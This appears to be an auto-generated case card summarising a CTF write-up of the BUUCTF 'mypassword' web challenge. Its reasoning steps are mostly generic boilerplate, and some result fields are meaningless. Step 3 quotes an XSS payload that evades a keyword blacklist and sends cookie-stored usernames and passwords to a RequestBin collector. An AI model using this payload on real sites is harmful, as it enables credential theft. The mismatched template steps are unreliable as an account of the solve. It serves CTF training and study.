# BUUCTF__[GWCTF 2019]mypassword_题解_风过江南乱的博客-CSDN博客

## Case Metadata

- Category: `Web`
- Platform: `BUUCTF`
- Difficulty: `unknown`
- Source repository: `https://github.com/apachecn/apachecn-ctf-wiki`
- Source commit: `762ca130572c95196cf120e5f4ad5fbdd88b1b93`
- Source file: `docs/BUUCTF__[GWCTF-2019]mypassword_题解_风过江南乱的博客-CSDN博客.md`
- Source URL: `https://github.com/apachecn/apachecn-ctf-wiki/blob/762ca130572c95196cf120e5f4ad5fbdd88b1b93/docs/BUUCTF__%5BGWCTF-2019%5Dmypassword_%E9%A2%98%E8%A7%A3_%E9%A3%8E%E8%BF%87%E6%B1%9F%E5%8D%97%E4%B9%B1%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2.md`
- Local source mirror: `sources/apachecn-apachecn-ctf-wiki/repo/docs/BUUCTF__[GWCTF-2019]mypassword_题解_风过江南乱的博客-CSDN博客.md`

## Why This Case Matters

Use this case as a Web reference for web-app challenges.

## Input Signals

- Artifacts: web-app
- Tools: not detected
- Techniques: crypto-analysis, http-analysis, waf-bypass, web-exploitation, xss

## First-Principles Route

- Identify the exposed entry point, reflected behavior, trust boundary, and any explicit hints or blacklists.
- Validate the suspected primitive with the smallest payload that proves code/data/control influence.
- Chain the primitive into file read, code execution, auth bypass, or state manipulation only after recording the bypass condition.

## Linked Assets

- Referenced assets: `1`
- `docs/img/1a84fd5faea6da496cd77ba227b92329.png`

## Solve Thinking

### Step 1: Document

- Route type: `evidence lookup`
- Why: For Web, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use the artifact-specific tool to collect the smallest evidence slice that answers the goal.
- Reasoning chain:
  - Recognize the section as evidence lookup.
  - Use the artifact-specific tool to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `-->`

### Step 2: BUUCTF__[GWCTF 2019]mypassword_题解_风过江南乱的博客-CSDN博客

- Route type: `credential discovery`
- Why: When a capture or logs mention a cleartext protocol, check credentials and followed streams before expensive analysis.
- Probe: Use the artifact-specific tool to inspect credentials, authentication fields, or followed streams before deeper analysis.
- Reasoning chain:
  - Recognize the section as credential discovery.
  - Use the artifact-specific tool to inspect credentials, authentication fields, or followed streams before deeper analysis.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `> 来源：[https://blog.csdn.net/TM_1024/article/details/116276324](https://blog.csdn.net/TM_1024/article/details/116276324)`

### Step 3: 题解

- Route type: `xss route`
- Why: XSS cases should classify the rendering context before payload design.
- Probe: Use the artifact-specific tool with the extracted filter/query `if(stripos($feedback,$val) !== false){` and inspect the matching evidence.
- Filters or commands:
  - `if(stripos($feedback,$val) !== false){`
  - `if (document.cookie && document.cookie != '') {`
  - `if(typeof(cookie['user']) != "undefined" && typeof(cookie['psw']) != "undefined"){`
  - `documcookieent.locacookietion="http://http.requestbin.buuoj.cn/*/?a="+res;`
  - `先访问`http://http.requestbin.buuoj.cn/`点击 `Create a RequestBin`获取一个链接，将poc中的`http://http.requestbin.buuoj.cn/*/` 中的*改为自己的标识符就行。过一会刷新。`
- Reasoning chain:
  - Recognize the section as xss route.
  - Use the artifact-specific tool with the extracted filter/query `if(stripos($feedback,$val) !== false){` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `1a84fd5faea6da496cd77ba227b92329`

## Reuse Checklist

- Match the new challenge's artifact and question shape against this case before copying any tool sequence.
- Start from the same evidence class, then adapt filters, fields, and timestamps to the new artifact.
- Promote any repeated manual action into a skill command before relying on it for the final solve.
